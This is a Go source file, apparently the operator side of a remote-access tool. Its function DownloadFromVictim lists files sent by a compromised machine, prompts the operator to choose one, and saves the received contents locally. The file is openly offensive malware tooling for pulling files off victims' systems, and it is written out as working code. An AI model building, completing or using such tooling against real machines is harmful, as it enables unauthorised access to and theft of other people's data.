package download

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
)

type FilesList struct {
	Files []string
}

type Data struct {
	FileName string
	FileSize int
	FileContent []byte
}



func DownloadFromVictim(connection net.Conn)(err error){
	filesStruct := &FilesList{}
	dec := gob.NewDecoder(connection)
	err = dec.Decode(filesStruct)


	for index, fileName := range filesStruct.Files{
		fmt.Println("\t", index, "\t", fileName)
	}

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("[+] Select file : ")
	file2downloadIndex_raw, err := reader.ReadString('\n')
	file2DownloadIndex := strings.TrimSuffix(file2downloadIndex_raw, "\n")

	file_index, _ := strconv.Atoi(file2DownloadIndex)

	FileName := filesStruct.Files[file_index]

	nbyte, err := connection.Write([]byte(FileName+ "\n"))
	fmt.Println("[+] File name sent :", nbyte)



	decoder := gob.NewDecoder(connection)
	fs := &Data{}

	err = decoder.Decode(fs)

	file, err := os.Create(fs.FileName)

	nbytes, err := file.Write(fs.FileContent)
	fmt.Println("[+] File downloaded successfully , ", nbytes)

	return
}